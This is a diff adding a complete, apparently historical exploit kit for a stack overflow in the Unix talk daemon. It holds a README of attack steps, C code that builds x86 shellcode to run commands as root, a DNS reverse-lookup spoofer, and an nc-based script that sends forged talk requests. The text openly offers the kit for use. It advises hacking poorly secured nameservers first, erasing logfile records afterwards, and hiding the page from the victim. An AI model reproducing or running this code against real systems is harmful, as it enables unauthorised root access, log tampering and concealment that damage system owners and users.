@@ -1,0 +1,408 @@
+ 
+
+/*
+README.talkd
+
+
+
+1. get root on some name server machine.
+
+2. start talkd (the exploit code generating program, not the talk daemon)
+and save its output someplace. make sure you got all the system-dependent
+parameters correctly. also that USERNAMELENGTH is equal to the length of the
+user name you will be using with the talkpage script later. the command
+supplied to talkd shouldn't be too long (usually can be up to 48 bytes).
+
+3. kill the name server daemon, and start up dns_rev instead, giving as a
+parameter an ip address that was under the authority of this name server in
+the in-addr.arpa domain, and whose ip address is not cached on the target
+host's nameserver (you can check if it is cached by looking it up with
+recursion turned off; or you can pick a random address and hope its not
+cached - if it is, try again with a different one. chances are that
+addresses of non-existing machines won't be cached so its best to use an
+address like that if there is one). feed the saved output as an input to
+dns_rev.
+
+4. start up talkd on the target host, by talk paging a non-existing user
+there. this is to bypass tcp wrappers (theoretically, you don't have to
+bypass them, but it's one thing less to worry about if you do). you have to
+do this from a host that is not served by the dns your messing with, since
+the wrappers will try to do dns lookups.
+
+5. (quickly, while the started talkd is still alive) page a logged in user
+that has messages enabled on the remote host, giving as a source ip address
+the address that you are spoofing (that is just the address in the talk
+protocol packet, you don't have to spoof ip packets source address - talkd
+is stupid enough not to care about them). this can be done with the
+'talkpage' script or something such. you can do this from any host. at this
+point, dns_rev should say 'reverse query accepted', and the remote talkd
+should have executed the command you supplied to talkd, that is, if you
+guessed the buffer address correctly.
+
+6. if you failed, check all the steps carefully again to find out what went
+wrong; you can probably repeat the whole thing in some 120 seconds (which is
+the time before talkd commits suicide, if no other requests arrive). if you
+were successfull, kill dns_rev, re-start named, log in to remote host, and
+erase any logfile records. you should know what to do from then on.
+
+one note, though; in order to get the best results in the cleanest way
+possible, you should first test the whole scenario on some playground
+machines that have the same system as the target host.
+
+
+
+
+lkd hole exploit. version 0.1.
+
+     usage: talkd system [[adrs] size] < command > output
+     
+   reads command to execute on remote host from stdin. writes code to
+   stdout. you have to feed the output to some sort of script or something
+   (try & use netcat for remote exploitation). you may specify address of
+   the buffer on stack on the command line. you may also specify buffer
+   size, which is size of the buffer (last two lines, actually) + size of
+   local variables up to (but not including) the return address - length of
+   anything that will get prepended to the code before it is fed into talk
+   buffers (such as "talk: respond with:  talk username@"). oh, and you have
+   to spoof the host name, of course. THIS ISN'T A NO-BRAINERS SKRIPT. you
+   want a no-brainers script, go use sendmail or something.
+   
+   curently defined systems: bsd386, linux386 (somebody wanna write some sparc
+   asm code here?)
+   
+   notes. in reality, some weird buffer copying and sizes overwriting is
+   going on in print_mesg() in talkd. that's why, for example, buffer has to
+   be filled with a non-negative nop code. if the order of variables in that
+   function is different (whether declared differently or re-arranged by the
+   compiler at its own free will), the simplistic approach used here might
+   no longer work. the hole might still be exploitable, though - the only
+   way to check is find out exactly what is going on in print_mesg() in your
+   talkd. other things to watch for: ESCAPESPACE inserts an instruction to
+   escape around the space-zero that is copied to the last line of talk
+   buffer, and ends up within the nops (the dots inside the nops fill-in are
+   assumed to be executed nops - which is the case on the i386, but might be
+   different on other architectures. if you can guess the exact code
+   address, you don't need to worry about escaping the dots or the
+   space-zero anyway - assuming the space falls somewhere into the nops, not
+   within the code itself. tty file, which is assumed to be the first or the
+   second parameter to print_mesg() is overwritten with a low address on the
+   stack, in order to shut up the talk message, so the user doesn't get to
+   see it. if this fails on your target, you will probably have to set up a
+   valid FILE structure on the stack, and know exactly where the structure
+   is, so you can supply its address (or try supplying a NULL, if that
+   works). failing that, the only choice left would be to let talkd display
+   the annoying message to the unsuspecting user, by leaving print_mesg()
+   parameters alone - and you would also have to put the command to be
+   executed inside the print_mesg() stack, which will limit its length
+   severly (always enough space for a "rm -rf /", though...).
+   
+ by Flash Gordon / CiA (with some ideas "borrowed" from others).        */
+
+unsigned char *codes[] = /* asm k0d3$ to start up a process on each system */
+    {"\x41\xa9\xeb\x3d\x59\x31\xd2\x8d\x71\x0f\x89\x56\xfd\x46\x80\x36"
+     "\x80\x75\xfa\x88\x51\x17\x8d\x59\x1a\x88\x13\x43\x89\x59\x08\x8d"
+     "\x59\x18\x89\x59\x04\x8d\x59\x10\x89\x19\x31\xc0\xb0\x3b\x89\x51"
+     "\xf0\x88\x51\xf5\x52\x51\x53\x50\xeb\x01\x90\x9a.---\x07\x31\xc0"
+     "\xb4\x02\x29\xc4\xe8\xb8\xff\xff\xff",
+     
+     "\x41\xa9\xeb\x2e\x59\x31\xd2\x8d\x71\x0f\x89\x56\xfd\x46\x80\x36"
+     "\x80\x75\xfa\x88\x51\x17\x8d\x59\x1a\x88\x13\x43\x89\x59\x08\x8d"
+     "\x59\x18\x89\x59\x04\x8d\x59\x10\x89\x19\x31\xc0\xb0\x05\x04\x06"
+     "\xcd\x80\xe8\xcd\xff\xff\xff"};
+
+#define PREFIX "/bin/sh -c "    /* don't change that, hardwired into code */
+     
+char *systems[] = {"bsd386", "linux386"};             
+
+#ifndef USERNAMELENGTH
+#define USERNAMELENGTH 9 /* president */
+#endif
+
+/* linux size is normally 237, 213 when re-arranged and without stack frame. */
+/* bsd 4.4 lite - increase bufsize by 272, escapespace by 136 */
+
+int sizes[] = {217 - USERNAMELENGTH, 213 - USERNAMELENGTH};
+int addrs[] = {0xEFBFDD6F, 0xBFFFFC6F}; /* DF2C, DD2C (?) on BSDI 1.1 (?) */
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+#ifndef NOESCAPE
+#ifndef ESCAPESPACE
+#define ESCAPESPACE 120 - 1 - 27 - USERNAMELENGTH
+#endif
+#endif
+
+#ifndef MAXLBLSIZ
+#define MAXLBLSIZ 63 /* protocol allows up to 63 but maybe can be up to 191 */
+#endif                         
+
+unsigned char *putint(nop, p, val) unsigned char nop, *p; unsigned val;
+{
+  int i;
+  unsigned char buf[sizeof(int)];
+  for (i = 0; i < sizeof(int); ++i) {
+    buf[i] = val; val >>= 8;
+  }  
+  if (nop != 0x41) /* assume big endian target */
+    for (i = sizeof(int) - 1; i >= 0; --i) *p++ = buf[i];
+  else /* assume little endian target */
+    for (i = 0; i < sizeof(int); ++i) *p++ = buf[i];
+  return p;
+}
+
+void main(argc, argv) int argc; char **argv;
+{
+  unsigned char *p, *q, *r, *s;
+  unsigned i = 0, l, adrs, size;
+  if (argc > 1) {
+    i = sizeof(systems) / sizeof(*systems);
+    while (i && strcasecmp(argv[1], systems[i - 1])) --i;
+  }
+  if (!i--) {
+    fprintf(stderr, "what?\n");
+    return;
+  }
+  adrs = addrs[i]; size = sizes[i];
+  if (argc > 2) {
+    adrs = strtoul(argv[2], 0, 0);
+    if (argc > 3) size = strtoul(argv[3], 0, 0);
+  }
+  if (p = malloc(4096)) {
+    memset(q = p, *codes[i], 4096);
+    strcpy(r = ((p += size) - strlen(codes[i] + 2)), codes[i] + 2); 
+    p = putint(*codes[i], putint(*codes[i], p, adrs), l = adrs - 2048);
+    p = putint(*codes[i], p, l); *p++ = '.'; *p++ = 'x'; *p++ = 'x'; *p++ = 'x';
+    strcpy(p, PREFIX); gets(p + strlen(p)); l = strlen(p);
+    if (l >= MAXLBLSIZ - 3 && (unsigned char *)strrchr(p, '.')) return;
+    do *p++ ^= 128; while (l--);
+    l = (unsigned char *)strchr(s = q, '.') - q;
+    while (l > MAXLBLSIZ) { 
+      if ((s += MAXLBLSIZ) >= r) s = r - 1;
+      *s++ = '.'; l -= MAXLBLSIZ + 1; 
+    }
+#ifdef ESCAPESPACE
+    if (q + ESCAPESPACE >= r - 2) return;
+    q[ESCAPESPACE] = codes[i][1];
+#endif    
+    fwrite(q, 1, p - q, stdout);
+  }
+}
+
+
+
+/* replace dns to spoof reverse queries.
+
+        usage: echo -n <host-name> | dns_rev <ip-address>
+        
+   ip-address is the address of host you wanna spoof. the program will wait
+   for a reverse query for this address to arrive, and will return whatever
+   it read from standard input (host-name). address queries for the spoofed
+   host-name will be answered with the ip-address supplied (to keep the tcp
+   wrappers happy). other queries that might arrive in the mean time will be
+   ignored. you hafta kill named before you do this sort of thing (and
+   eventually bring it back up later). currently works only with udp.
+   
+   by Flash Gordon / CiA                                                    */
+   
+#include <stdio.h>   
+#include <string.h>
+#include <sys/types.h>   
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>   
+
+#define DNSPORT 53
+#define REVDOM ".IN-ADDR.ARPA"
+#ifndef MAXDOMSIZ
+#define MAXDOMSIZ 384 /* using more than 256 bytes violates the protocol */
+#endif                         
+
+/*#define MYNAME "fully qualified domain name of name-server machine" */
+/*#define MYADRS 0x7f000001 - ip address of name-server machine, in hex */
+
+unsigned char *get_dom_name(p, l) unsigned char **p; int *l;
+{
+  static unsigned char buf[BUFSIZ];
+  int i;
+  unsigned char *q = buf;
+  while (1) {
+    if (--*l < 0) return 0;
+    if (!(i = *(*p)++)) {
+      *q = 0; return buf;
+    }
+    if (*l < i) return 0;
+    *l -= i;
+    if (q != buf) *q++ = '.';
+    while (i--) *q++ = *(*p)++;
+  }
+}
+
+unsigned char *put_dom_name(p, q) unsigned char *p, *q;
+{
+  unsigned char *t, dbuf[MAXDOMSIZ];
+  q = strcpy(dbuf, q);
+  while (1) {
+    if (t = strchr(q, '.')) *t = 0;
+    *p = strlen(q);
+    strcpy(p + 1, q);
+    p += *p + 1;
+    if (!t) return p + 1;
+    q = t + 1;
+  }
+}
+
+unsigned long rev_long(l) unsigned long l;
+{
+  unsigned long i = 0;
+  int n = sizeof(i);
+  while (n--) {
+    i = (i << 8) | (l & 255); l >>= 8;
+  }
+  return i;
+}
+
+void main(argc, argv) int argc; char **argv;
+{
+  unsigned long ip, rip, sip;
+  int i, s, l = 0;
+  unsigned char *p, *q;
+  struct sockaddr_in addr;
+  unsigned char buf[BUFSIZ], answer[MAXDOMSIZ], abuf[32];
+#ifdef MYNAME
+  unsigned char hostname[] = MYNAME;
+#else
+  unsigned char hostname[32];
+  if (gethostname(hostname, sizeof(hostname))) return;
+#endif
+  if (argc != 2 || (rip = rev_long(sip = ip = inet_addr(argv[1]))) == -1) 
+    return;
+#ifdef MYADRS
+  sip = htonl(MYADRS); 
+#endif
+  while ((i = getchar()) != EOF) {
+    if (l == sizeof(answer) - 1) return;
+    answer[l++] = i;
+  }
+  answer[l++] = 0;
+  if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1) return;
+  addr.sin_family = AF_INET; addr.sin_addr.s_addr = INADDR_ANY;
+  addr.sin_port = htons(DNSPORT);
+  if (bind(s, (struct sockaddr *)&addr, sizeof(addr))) return;
+  printf("waiting...\n");
+  while (1) {
+    l = sizeof(addr);
+    l = recvfrom(s, buf, sizeof(buf), 0, (struct sockaddr *)&addr, &l);
+    if (l == -1) return;
+    p = buf + 12; l -= 12; i = 0;
+    if (!(buf[2] >> 3) && !buf[4] && buf[5] == 1 && (q = get_dom_name(&p, &l))
+     && l >= 4 && !*p++ && (++p, !*p++) && *p++ == 1) {
+      i = strlen(q);
+      if (p[-3] != 12 || (i -= sizeof(REVDOM) - 1) <= 0 
+       || strcasecmp(q + i, REVDOM) || (q[i] = 0, inet_addr(q) != rip))
+        i = -(p[-3] == 1 && !strcasecmp(q, answer));
+    }
+    printf("%s query from: %s\n", i == 0 ? "rejecting" : i > 0 ?
+     "answering reverse" : "answering forward", inet_ntoa(addr.sin_addr));
+    if (i) {
+      buf[2] |= 0x84; buf[3] = 0x80;
+      buf[6] = buf[8] = buf[10] = 0; buf[7] = buf[9] = buf[11] = 1; 
+      *p++ = 0xc0; *p++ = 12; *p++ = 0; *p++ = i > 0 ? 12 : 1; 
+      *p++ = 0; *p++ = 1; *p++ = 0; *p++ = 0; *p++ = 0; *p++ = 0; 
+      if (i > 0) {
+        *p++ = (i = strlen(answer) + 2) >> 8; *p++ = i;
+        q = put_dom_name(p, answer);
+        strcat(p = strcpy(abuf, inet_ntoa(*(struct in_addr *)&rip)), REVDOM);
+      } else {
+        *p++ = 0; *p++ = sizeof(ip); memcpy(p, &ip, sizeof(ip));
+        q = p + sizeof(ip); p = hostname;
+      }
+      /* authority record; assume domain authority for forward queries,
+         class C net authority for reverse queries. who cares anyway. */
+      if (p = strchr(p, '.')) ++p; else p = "";
+      q = put_dom_name(q, p);
+      *q++ = 0; *q++ = 2; *q++ = 0; *q++ = 1; *q++ = *q++ = *q++ = *q++ = 0;
+      *q++ = 0; *q++ = strlen(hostname) + 2; q = put_dom_name(p = q, hostname);
+      /* additional record - not really that essential, too. */
+      *q++ = ((i = p - buf) >> 8) | 0xc0; *q++ = i; 
+      *q++ = 0; *q++ = 1; *q++ = 0; *q++ = 1; *q++ = *q++ = *q++ = *q++ = 0; 
+      *q++ = 0; *q++ = sizeof(sip); memcpy(q, &sip, sizeof(sip)); 
+      q += sizeof(sip);
+      if (sendto(s, buf, i = q - buf, 0, (struct sockaddr *)&addr, 
+       sizeof(addr)) == i) printf("sending %d bytes...\n", i);
+      else perror("sendto");
+    }
+  }
+}
+
+
+t
+
+#
+# usage: talkpage <user@host> <sourcehost>
+#
+# note: this version has no dns support. USE NUMERIC IP ADDRESSES OR DIE.
+#
+PUSSY=nc
+LAMER=president
+PHOST=$1
+FHOST=`echo $2 | awk -F . '{ if (NF == 4) for (i = 1; i <= 4; i++) \
+ printf "\\\%o", $i }'`
+PUSER=`echo $PHOST | awk -F @ '{ printf "%s", $1 }'`
+PNAME=`echo $PHOST | awk -F @ '{ printf "%s", $2 }'`
+PHOST=`echo $PNAME | awk -F . '{ if (NF == 4) for (i = 1; i <= 4; i++) \
+ printf "\\\%o", $i }'`
+if test "$PHOST" = "\0\0\0\0"; then PHOST=; fi
+if test -n "$FHOST"; then
+if test -n "$PUSER" -a -n "$PHOST"; then
+  PUSER=`echo $LAMER $PUSER | awk '{ for (j = 1; j <= NF; j++) {
+   printf "%s", substr($j,1,11); \
+   for (i = length($j); i < 11; i++) printf "\\\0"; printf "\\\0"; }}'`
+  echo -ne "\1\3\0\0\0\0\0\1\0\2\2\232$PHOST\0\0\0\0\0\0\0\0\0\2\2\232\
+$FHOST\0\0\0\0\0\0\0\0\0\0\0\1$PUSER\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0" \
+   | $PUSSY -u -w 1 $PNAME 518
+fi
+fi
+
+
+
+
+
+
+
+
+
+
+
+
+==========================================================================
+ 
+
+okay, the material here is an exploit for a stack overflow bug in talkd that has been
+known for about a year (and still not patched on most hosts). 
+ 
+requirements:
+ 
+ - root on a machine that serves as a primary dns for some host
+anywhere on the net (root on all secondary servers might also be
+necessary in certain cases). hint: look for dns machines somewhere
+in the third world. they aren't very difficult to hack, to say
+the least.
+ - at least one user with "messages on" must be logged on to the host
+you want to attack, and you must know her or his login name. they
+won't get paged, though, if the attack is successful.
+ - current code works only for bsd (freebsd, netbsd, bsdi, etc.) and
+linux, and only for intel x86, BUT it is adaptable to any other system
+or architecture with a little programming in assembler (if somebody
+does that, please let me know. if i'm not reachable by e-mail here
+please post with a subject 'talkd' to some security group or mailing
+list that gets archived. if you care).
+ 
+result:
+ 
+ - root on the host you're attacking, if you are successful.
+ - no traces at all, except possibly something like "talkd:
+connection refused" in the logfile, which is in principle also
+avoidable.
+ 
